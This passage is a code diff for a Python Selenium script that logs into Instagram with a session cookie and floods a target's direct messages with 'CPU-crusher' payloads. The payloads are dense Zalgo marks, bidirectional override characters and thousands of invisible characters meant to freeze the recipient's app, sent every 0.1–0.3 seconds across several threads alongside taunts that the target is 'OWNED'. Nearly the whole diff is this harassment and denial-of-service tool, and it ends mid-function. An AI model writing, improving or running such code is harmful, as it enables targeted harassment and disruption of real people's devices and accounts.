@@ -1,82 +1,89 @@
 # -*- coding: utf-8 -*-
-# 🚀 PROJECT: PRAVEER PAPA - 10 AGENT MATRIX
-# 📅 STATUS: 200 OVERRIDES | 80-MARK ZALGO | MAX IMPACT
+# 🚀 PROJECT: PRAVEER NC (CPU-CRUSHER V2)
+# 📅 STATUS: PLANE-1 OVERLAYS | 100-ZALGO | TOTAL FREEZE
 
-import os, time, random, threading, sys, gc, tempfile, shutil
+import os, time, random, threading, sys, gc, tempfile
 from concurrent.futures import ThreadPoolExecutor
 from selenium import webdriver
 from selenium.webdriver.common.by import By
 from selenium.webdriver.common.keys import Keys
 from selenium.webdriver.chrome.options import Options
 
-# --- CONFIG ---
+# --- MATRIX CONFIG ---
 THREADS = 2
 SESSION_LIMIT = 180 
 MACHINE_ID = os.getenv("MACHINE_ID", "1")
 
-def get_matrix_payload(target_name):
-    """The Matrix Payload: 200 Overrides + 80-mark Zalgo Skyscraper."""
-    header = f"👑 PRAVEER PAPA 👑 SYSTEM ERROR: {target_name.upper()} HAS BEEN OWNED\n"
+def get_cpu_crusher_payload(target_name):
+    """The CPU Crusher: Mathematical Vector Attack & Extreme Density."""
+    header = f"👑 𝖯𝖱𝖠𝖵𝖤𝖤𝖱 𝖯𝖠𝖯𝖠 👑 SYSTEM FAILURE: {target_name.upper()} HAS BEEN OWNED\n"
     
-    # 💥 THE 'RECURSION TRAP' (200 Directional Overrides)
-    direction_chaos = ("\u202E" + "\u202D") * 200 
+    # 💥 PLANE-1 OVERLAYS (Vector Glyphs)
+    vector_chaos = "𝔓𝔄𝔙𝔈𝔈𝔔 𝔓𝔄𝔓𝔄 " * 8
     
-    # 💥 THE 'ZALGO TOWER' (80-mark density)
-    z_tower = "̸" * 80
+    # 💥 THE 'RECURSIVE ZALGO' (100 marks per char)
+    z_tower = "̸" * 100
     
-    # 💥 THE 'BLOAT' (5,500 invisible characters)
-    bloat = "".join(random.choice(["\u200B", "\u200D", "\u2060"]) for _ in range(5500))
+    # 💥 THE 'MEMORY BLOAT' (6,000 invisible markers)
+    bloat = "".join(random.choice(["\u200B", "\u200D", "\u2060", "\uFEFF"]) for _ in range(6000))
     
-    lines = [header, bloat]
+    lines = [header, vector_chaos, bloat]
     
-    # 💥 60 Lines of Skyscraper
-    for _ in range(60):
-        lines.append(direction_chaos + f"{target_name.upper()}_OWNED" + z_tower)
+    for i in range(65):
+        prefix = "\u202E" if i % 2 == 0 else "\u202D"
+        lines.append(f"{prefix} 𝖯𝖱𝖠𝖵𝖤𝖤𝖱_𝖮𝖶𝖭𝖲_𝖸𝖮𝖴 {z_tower}")
     
-    lines.append(bloat + "\n🛑 SYSTEM UNRESPONSIVE 🛑")
-    return "\n".join(lines)
+    return "\n".join(lines)[:9900]
+
+def get_driver(agent_id):
+    chrome_options = Options()
+    chrome_options.add_argument("--headless=new")
+    chrome_options.add_argument("--no-sandbox")
+    chrome_options.add_argument("--disable-dev-shm-usage")
+    chrome_options.add_argument("--disable-gpu")
+    chrome_options.add_argument("--window-size=1920,1080")
+    chrome_options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
+    return webdriver.Chrome(options=chrome_options)
 
 def run_life_cycle(agent_id, cookie, target_id, target_name):
     while True:
         driver = None
-        session_start = time.time()
         try:
-            driver = webdriver.Chrome(options=chrome_options)
+            print(f"[M{MACHINE_ID}-A{agent_id}] ⚡ CPU-CRUSHER DEPLOYED...", flush=True)
+            driver = get_driver(agent_id)
             driver.get("https://www.instagram.com/")
             driver.add_cookie({'name': 'sessionid', 'value': cookie, 'path': '/', 'domain': '.instagram.com'})
             driver.refresh()
-            time.sleep(5)
+            time.sleep(7)
             driver.get(f"https://www.instagram.com/direct/t/{target_id}/")
-            time.sleep(10)
+            time.sleep(12)
 
+            session_start = time.time()
             while (time.time() - session_start) < SESSION_LIMIT:
                 try:
                     box = driver.find_element(By.XPATH, "//div[@role='textbox'] | //textarea")
-                    payload = get_matrix_payload(target_name)
+                    
+                    # 🔥 THE 'IMPACT' SPEED: 0.1s - 0.3s
+                    payload = get_cpu_crusher_payload(target_name)
                     driver.execute_script("""
                         var el = arguments[0];
                         document.execCommand('insertText', false, arguments[1]);
                         el.dispatchEvent(new Event('input', { bubbles: true }));
                     """, box, payload)
+                    
                     box.send_keys(Keys.ENTER)
-                    print(f"[M{MACHINE_ID}-A{agent_id}] IMPACT SENT")
-                    time.sleep(random.uniform(0.8, 1.5))
+                    
+                    print(f"[M{MACHINE_ID}-A{agent_id}] 💥 IMPACT DELIVERED", flush=True)
+                    time.sleep(random.uniform(0.1, 0.3)) 
+                    
                 except:
-                    time.sleep(3)
-                    break
+                    time.sleep(5)
+                    break 
         except Exception: pass
         finally:
             if driver: driver.quit()
             gc.collect()
-            time.sleep(2)
-
-# Global Chrome Options
-chrome_options = Options()
-chrome_options.add_argument("--headless")
-chrome_options.add_argument("--no-sandbox")
-chrome_options.add_argument("--disable-dev-shm-usage")
-chrome_options.add_argument("--window-size=1920,1080")
-chrome_options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36")
+            time.sleep(3)
 
 def main():
     cookie = os.environ.get("SESSION_ID", "").strip()
